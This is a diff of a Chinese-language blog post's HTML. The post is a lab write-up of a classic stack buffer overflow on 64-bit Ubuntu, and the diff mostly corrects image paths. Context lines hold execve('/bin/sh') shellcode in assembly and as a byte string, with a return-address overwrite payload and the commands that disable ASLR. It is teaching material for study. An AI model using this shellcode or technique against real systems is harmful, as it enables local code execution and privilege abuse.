@@ -53,20 +53,20 @@
 <meta property="og:site_name" content="Xsyin">
 <meta property="og:description" content="目的 理解掌握C 栈帧结构 Shellcode 构造 加深理解栈溢出攻击原理及防护措施  要求 在关闭安全机制下,在Linux系统平台上实现缓冲区溢出攻击 开启安全保护机制,运行一样的溢出攻击代码,比较实现现象">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://xsyin.github.io/2018/05/01/%E5%9F%BA%E7%A1%80%E6%A0%88%E6%BA%A2%E5%87%BA/%E5%9F%BA%E7%A1%80%E6%A0%88%E6%BA%A2%E5%87%BA/%E9%80%89%E5%8C%BA_025.png">
-<meta property="og:image" content="https://xsyin.github.io/2018/05/01/%E5%9F%BA%E7%A1%80%E6%A0%88%E6%BA%A2%E5%87%BA/%E5%9F%BA%E7%A1%80%E6%A0%88%E6%BA%A2%E5%87%BA/%E9%80%89%E5%8C%BA_028.png">
-<meta property="og:image" content="https://xsyin.github.io/2018/05/01/%E5%9F%BA%E7%A1%80%E6%A0%88%E6%BA%A2%E5%87%BA/%E5%9F%BA%E7%A1%80%E6%A0%88%E6%BA%A2%E5%87%BA/%E9%80%89%E5%8C%BA_029.png">
-<meta property="og:image" content="https://xsyin.github.io/2018/05/01/%E5%9F%BA%E7%A1%80%E6%A0%88%E6%BA%A2%E5%87%BA/%E5%9F%BA%E7%A1%80%E6%A0%88%E6%BA%A2%E5%87%BA/%E9%80%89%E5%8C%BA_031.png">
-<meta property="og:image" content="https://xsyin.github.io/2018/05/01/%E5%9F%BA%E7%A1%80%E6%A0%88%E6%BA%A2%E5%87%BA/%E5%9F%BA%E7%A1%80%E6%A0%88%E6%BA%A2%E5%87%BA/%E9%80%89%E5%8C%BA_032.png">
-<meta property="og:image" content="https://xsyin.github.io/2018/05/01/%E5%9F%BA%E7%A1%80%E6%A0%88%E6%BA%A2%E5%87%BA/%E5%9F%BA%E7%A1%80%E6%A0%88%E6%BA%A2%E5%87%BA/%E9%80%89%E5%8C%BA_033.png">
-<meta property="og:image" content="https://xsyin.github.io/2018/05/01/%E5%9F%BA%E7%A1%80%E6%A0%88%E6%BA%A2%E5%87%BA/%E5%9F%BA%E7%A1%80%E6%A0%88%E6%BA%A2%E5%87%BA/%E9%80%89%E5%8C%BA_034.png">
-<meta property="og:image" content="https://xsyin.github.io/2018/05/01/%E5%9F%BA%E7%A1%80%E6%A0%88%E6%BA%A2%E5%87%BA/%E5%9F%BA%E7%A1%80%E6%A0%88%E6%BA%A2%E5%87%BA/%E9%80%89%E5%8C%BA_035.png">
+<meta property="og:image" content="https://xsyin.github.io/2018/05/01/%E5%9F%BA%E7%A1%80%E6%A0%88%E6%BA%A2%E5%87%BA/%E9%80%89%E5%8C%BA_025.png">
+<meta property="og:image" content="https://xsyin.github.io/2018/05/01/%E5%9F%BA%E7%A1%80%E6%A0%88%E6%BA%A2%E5%87%BA/%E9%80%89%E5%8C%BA_028.png">
+<meta property="og:image" content="https://xsyin.github.io/2018/05/01/%E5%9F%BA%E7%A1%80%E6%A0%88%E6%BA%A2%E5%87%BA/%E9%80%89%E5%8C%BA_029.png">
+<meta property="og:image" content="https://xsyin.github.io/2018/05/01/%E5%9F%BA%E7%A1%80%E6%A0%88%E6%BA%A2%E5%87%BA/%E9%80%89%E5%8C%BA_031.png">
+<meta property="og:image" content="https://xsyin.github.io/2018/05/01/%E5%9F%BA%E7%A1%80%E6%A0%88%E6%BA%A2%E5%87%BA/%E9%80%89%E5%8C%BA_032.png">
+<meta property="og:image" content="https://xsyin.github.io/2018/05/01/%E5%9F%BA%E7%A1%80%E6%A0%88%E6%BA%A2%E5%87%BA/%E9%80%89%E5%8C%BA_033.png">
+<meta property="og:image" content="https://xsyin.github.io/2018/05/01/%E5%9F%BA%E7%A1%80%E6%A0%88%E6%BA%A2%E5%87%BA/%E9%80%89%E5%8C%BA_034.png">
+<meta property="og:image" content="https://xsyin.github.io/2018/05/01/%E5%9F%BA%E7%A1%80%E6%A0%88%E6%BA%A2%E5%87%BA/%E9%80%89%E5%8C%BA_035.png">
 <meta property="article:published_time" content="2018-05-01T02:53:54.000Z">
 <meta property="article:modified_time" content="2018-05-01T02:53:54.000Z">
 <meta property="article:author" content="Xu Shouyin">
 <meta property="article:tag" content="栈溢出">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://xsyin.github.io/2018/05/01/%E5%9F%BA%E7%A1%80%E6%A0%88%E6%BA%A2%E5%87%BA/%E5%9F%BA%E7%A1%80%E6%A0%88%E6%BA%A2%E5%87%BA/%E9%80%89%E5%8C%BA_025.png">
+<meta name="twitter:image" content="https://xsyin.github.io/2018/05/01/%E5%9F%BA%E7%A1%80%E6%A0%88%E6%BA%A2%E5%87%BA/%E9%80%89%E5%8C%BA_025.png">
 
 <link rel="canonical" href="https://xsyin.github.io/2018/05/01/%E5%9F%BA%E7%A1%80%E6%A0%88%E6%BA%A2%E5%87%BA/">
 
@@ -282,7 +282,7 @@
 <a id="more"></a>
 
 <h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><p>​      <code>C</code> 栈帧结构如下：</p>
-<p><img src="%E5%9F%BA%E7%A1%80%E6%A0%88%E6%BA%A2%E5%87%BA/%E9%80%89%E5%8C%BA_025.png" alt="区_02"></p>
+<p><img src="%E9%80%89%E5%8C%BA_025.png" alt="区_02"></p>
 <p>​         因此当当前帧的局部变量和临时变量超出区域，覆盖了<code>ebp</code> 和返回地址时，就实现了栈溢出攻击。再通过精心设计返回地址，使其为<code>Shellcode</code> 的起始地址，就完成了运行流的劫持。</p>
 <p>​      实例基于 64位 <code>Ubuntu \ 16.04</code> 操作系统版本以及 <code>gcc,gdb</code> 版本信息如下：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Linux ubuntu 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64 x86_64 x86_64 GNU&#x2F;Linux</span><br><span class="line"></span><br><span class="line">gcc (Ubuntu 5.4.0-6ubuntu1~16.04.9) 5.4.0 20160609</span><br><span class="line"></span><br><span class="line">GNU gdb (Ubuntu 7.11.1-0ubuntu1~16.5) 7.11.1</span><br></pre></td></tr></table></figure>
@@ -294,9 +294,9 @@
 <p>​       编写<code>Shellcode</code> ，该<code>shellcode</code> 调用<code>execve(&quot;/bin/sh&quot;,NULL)</code> ，启动一个新的<code>shell</code>，验证其功能，参考: <a href="https://www.exploit-db.com/exploits/36858/" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/36858/</a> ，编写汇编文件如下：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">.global _start</span><br><span class="line">_start:</span><br><span class="line">    # char *const argv[]</span><br><span class="line">    xorl %esi, %esi</span><br><span class="line"> </span><br><span class="line">    # &#39;h&#39; &#39;s&#39; &#39;&#x2F;&#39; &#39;&#x2F;&#39; &#39;n&#39; &#39;i&#39; &#39;b&#39; &#39;&#x2F;&#39;</span><br><span class="line">    movq &#96;0x68732f2f6e69622f, %rbx</span><br><span class="line"> </span><br><span class="line">    # for &#39;\x00&#39;</span><br><span class="line">    pushq %rsi</span><br><span class="line">    pushq %rbx</span><br><span class="line">    pushq %rsp</span><br><span class="line">    </span><br><span class="line">    # const char *filename</span><br><span class="line">    popq %rdi</span><br><span class="line"> </span><br><span class="line">    # __NR_execve 59</span><br><span class="line">    pushq &#96;59</span><br><span class="line">    popq %rax</span><br><span class="line"> </span><br><span class="line">    # char *const envp[]</span><br><span class="line">    xorl %edx, %edx</span><br><span class="line">    syscall</span><br></pre></td></tr></table></figure>
 
-<p><img src="%E5%9F%BA%E7%A1%80%E6%A0%88%E6%BA%A2%E5%87%BA/%E9%80%89%E5%8C%BA_028.png" alt="区_02"></p>
+<p><img src="%E9%80%89%E5%8C%BA_028.png" alt="区_02"></p>
 <p>   提取机器码：</p>
-<p><img src="%E5%9F%BA%E7%A1%80%E6%A0%88%E6%BA%A2%E5%87%BA/%E9%80%89%E5%8C%BA_029.png" alt="区_02"></p>
+<p><img src="%E9%80%89%E5%8C%BA_029.png" alt="区_02"></p>
 <ul>
 <li>漏洞代码</li>
 </ul>
@@ -304,9 +304,10 @@
 
 <p>​       上面这段程序栈溢出漏洞触发点在<code>strcpy</code>函数, 函数没有做边界检查，可导致栈溢出覆盖返回地址。成功利用栈溢出需要确定覆盖多少个字节可以覆盖到返回地址。因此在<code>gdb</code>调试时确定<code>shellcode</code>的地址即<code>str</code>复制后<code>buf</code>的首地址，让返回地址指向该地址。</p>
 <ul>
-<li>结果</li>
+<li><p>结果</p>
+<p>为了更简单的方式实现栈溢出，需要关闭一些保护措施。</p>
+</li>
 </ul>
-<p>​  为了更简单的方式实现栈溢出，需要关闭一些保护措施。</p>
 <ul>
 <li><p><code>ASLR</code> (地址空间布局随机化)</p>
 <p>关闭<code>ASLR</code>：<code>echo 0 |sudo tee /proc/sys/kernel/randomize_va_space</code></p>
@@ -318,19 +319,19 @@
 </li>
 </ul>
 <p>编译调试：</p>
-<p><img src="%E5%9F%BA%E7%A1%80%E6%A0%88%E6%BA%A2%E5%87%BA/%E9%80%89%E5%8C%BA_031.png" alt="区_03"></p>
+<p><img src="%E9%80%89%E5%8C%BA_031.png" alt="区_03"></p>
 <p>​       从调试结果可知，<code>buf</code> 的首地址为 <code>0x7fffffffdaa0</code> ，且查看内存该地址处确实为 <code>Shellcode</code> 起始代码。为了覆盖到返回地址，即填充字节至且包括8字节<code>rbp</code> (<code>0x7fffffffdac0</code>) ，则除了<code>shellcode</code>外还需要填充17字节。另外返回地址为<code>0x7fffffffdaa0</code>,改为小端模式<code>\xa0\xda\xff\xff\xff\x7f</code>。因此：</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> str[<span class="number">60</span>]=<span class="string">"\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56"</span></span><br><span class="line">              <span class="string">"\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"</span></span><br><span class="line">              <span class="string">"\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61"</span></span><br><span class="line">              <span class="string">"\xa0\xda\xff\xff\xff\x7f\x00\x00"</span>;</span><br></pre></td></tr></table></figure>
 
 <p>​     重新编译，gdb调试运行：</p>
-<p><img src="%E5%9F%BA%E7%A1%80%E6%A0%88%E6%BA%A2%E5%87%BA/%E9%80%89%E5%8C%BA_032.png" alt="区_03"></p>
+<p><img src="%E9%80%89%E5%8C%BA_032.png" alt="区_03"></p>
 <p> 成功运行。然而实际运行却是段错误，原因是gdb有自己的变量环境，变量的存放地址和程序实际运行会不一致，因此只需要把返回地址改为shellcode实际存放的地址即可，填充长度无须改变，因为相对偏移不变。</p>
 <p>获取<code>shellcode</code> 实际地址，可以打印出<code>buf</code> 地址，也可以利用内核转储获取真实地址。首先启用内核转储 <code>ulimit -c unlimited</code>  ，缺省情况下，内核在coredump时所产生的core文件放在与该程序相同的目录中，并且文件名固定为core。</p>
-<p><img src="%E5%9F%BA%E7%A1%80%E6%A0%88%E6%BA%A2%E5%87%BA/%E9%80%89%E5%8C%BA_033.png" alt="区_03"></p>
+<p><img src="%E9%80%89%E5%8C%BA_033.png" alt="区_03"></p>
 <p>因此修改<code>str</code> 尾部为<code>\x10\xdb\xff\xff\xff\x7f\x00\x00</code>。重新编译运行：</p>
-<p><img src="%E5%9F%BA%E7%A1%80%E6%A0%88%E6%BA%A2%E5%87%BA/%E9%80%89%E5%8C%BA_034.png" alt="区_03"></p>
+<p><img src="%E9%80%89%E5%8C%BA_034.png" alt="区_03"></p>
 <p>若启用保护措施，正常编译：</p>
-<p><img src="%E5%9F%BA%E7%A1%80%E6%A0%88%E6%BA%A2%E5%87%BA/%E9%80%89%E5%8C%BA_035.png" alt="区_03"></p>
+<p><img src="%E9%80%89%E5%8C%BA_035.png" alt="区_03"></p>
 
     </div>
 
